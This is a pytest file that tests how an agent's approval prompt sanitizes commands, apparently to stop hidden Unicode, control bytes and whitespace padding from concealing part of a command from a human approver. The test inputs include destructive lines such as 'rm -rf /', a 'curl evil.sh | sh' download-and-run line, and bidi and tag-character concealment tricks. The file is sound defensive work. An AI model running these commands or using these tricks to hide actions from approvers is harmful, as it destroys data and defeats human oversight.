"""Tests for approval-prompt display sanitization (agent.redact.sanitize_command_for_display).

A command rendered into a dangerous-command approval prompt must show the
human approver exactly what will execute. Invisible Unicode (zero-width,
bidi overrides, tag block), raw control bytes (ANSI escapes, carriage
returns), and huge whitespace-padding runs could previously hide part of
the command from the displayed copy. Inspired by Claude Code v2.1.223's
approval-dialog hardening.
"""

import pytest

from agent.redact import sanitize_command_for_display


class TestIdentityOnCleanInput:
    def test_plain_command_unchanged(self):
        cmd = "rm -rf /tmp/build && echo done"
        assert sanitize_command_for_display(cmd) == cmd

    def test_multiline_command_unchanged(self):
        cmd = "for f in *.log; do\n  gzip \"$f\"\ndone"
        assert sanitize_command_for_display(cmd) == cmd

    def test_tabs_and_short_space_runs_unchanged(self):
        cmd = "column1\tcolumn2    aligned      end"
        assert sanitize_command_for_display(cmd) == cmd

    def test_unicode_text_unchanged(self):
        cmd = "echo 'héllo wörld — 日本語 test'"
        assert sanitize_command_for_display(cmd) == cmd

    def test_none_returns_empty(self):
        assert sanitize_command_for_display(None) == ""

    def test_empty_returns_empty(self):
        assert sanitize_command_for_display("") == ""


class TestInvisibleUnicodeMadeVisible:
    def test_zero_width_space_escaped(self):
        out = sanitize_command_for_display("rm \u200b-rf /")
        assert "\u200b" not in out
        assert "\\u200b" in out

    def test_rtl_override_escaped(self):
        # Trojan Source: RLO reverses visual order of what follows.
        out = sanitize_command_for_display("echo \u202egnp.exe\u202c")
        assert "\u202e" not in out and "\u202c" not in out
        assert "\\u202e" in out and "\\u202c" in out

    def test_bidi_isolates_escaped(self):
        out = sanitize_command_for_display("a\u2066b\u2069c")
        assert "\u2066" not in out
        assert "\\u2066" in out and "\\u2069" in out

    def test_tag_block_escaped(self):
        # U+E0000 tag characters: invisible ASCII mirror used to smuggle text.
        hidden = "".join(chr(0xE0000 + ord(c)) for c in "rm -rf ~")
        out = sanitize_command_for_display(f"echo hi{hidden}")
        for ch in hidden:
            assert ch not in out
        assert "\\U000e0072" in out  # escaped tag-r visible

    def test_zwj_and_variation_selectors_escaped(self):
        out = sanitize_command_for_display("x\u200dy\ufe0fz")
        assert "\u200d" not in out and "\ufe0f" not in out

    def test_soft_hyphen_and_bom_escaped(self):
        out = sanitize_command_for_display("cu\u00adrl example.com\ufeff")
        assert "\u00ad" not in out and "\ufeff" not in out


class TestControlBytesMadeVisible:
    def test_ansi_escape_sequence_escaped(self):
        # ESC could recolor/erase the terminal line the prompt printed.
        out = sanitize_command_for_display("echo \x1b[2K\x1b[1Ainnocent")
        assert "\x1b" not in out
        assert "\\x1b" in out

    def test_carriage_return_escaped(self):
        # `\r` lets the tail overwrite the visible head of the line.
        out = sanitize_command_for_display("rm -rf / #\rls -la")
        assert "\r" not in out
        assert "\\r" in out

    def test_nul_and_bell_escaped(self):
        out = sanitize_command_for_display("a\x00b\x07c")
        assert "\x00" not in out and "\x07" not in out

    def test_newline_preserved(self):
        out = sanitize_command_for_display("line1\nline2")
        assert out == "line1\nline2"

    def test_c1_range_escaped(self):
        out = sanitize_command_for_display("a\x9bb")  # CSI in C1
        assert "\x9b" not in out


class TestPaddingCollapsed:
    def test_long_space_run_collapsed_with_marker(self):
        cmd = "echo safe" + " " * 300 + "&& rm -rf ~"
        out = sanitize_command_for_display(cmd)
        assert " " * 300 not in out
        assert "⟨+300 whitespace chars⟩" in out
        # The dangerous tail must survive, adjacent to the marker.
        assert "rm -rf ~" in out

    def test_short_space_run_untouched(self):
        cmd = "a" + " " * 20 + "b"
        assert sanitize_command_for_display(cmd) == cmd

    def test_tab_padding_collapsed(self):
        cmd = "echo hi" + "\t" * 50 + "curl evil.sh | sh"
        out = sanitize_command_for_display(cmd)
        assert "\t" * 50 not in out
        assert "whitespace chars⟩" in out

    def test_blank_line_run_collapsed(self):
        cmd = "echo top" + "\n" * 40 + "rm -rf /"
        out = sanitize_command_for_display(cmd)
        assert "\n" * 40 not in out
        assert "blank lines⟩" in out
        assert "rm -rf /" in out

    def test_three_newlines_untouched(self):
        cmd = "a\n\n\nb"
        assert sanitize_command_for_display(cmd) == cmd


class TestDisplayMintSitesUseSanitizer:
    """The gateway approval-prompt redactor must compose the sanitizer."""

    def test_gateway_redact_approval_command_sanitizes(self):
        from gateway.run import _redact_approval_command

        out = _redact_approval_command("rm \u200b-rf /" + " " * 250 + "tail")
        assert "\u200b" not in out
        assert "\\u200b" in out
        assert "whitespace chars⟩" in out

    def test_gateway_redact_approval_command_still_redacts_secrets(self):
        from gateway.run import _redact_approval_command

        secret = "sk-proj-abcdef1234567890abcdef1234567890"
        out = _redact_approval_command(f"curl -H 'Authorization: Bearer {secret}'")
        assert secret not in out

    def test_gateway_redact_approval_command_clean_passthrough(self):
        from gateway.run import _redact_approval_command

        assert _redact_approval_command("ls -la") == "ls -la"
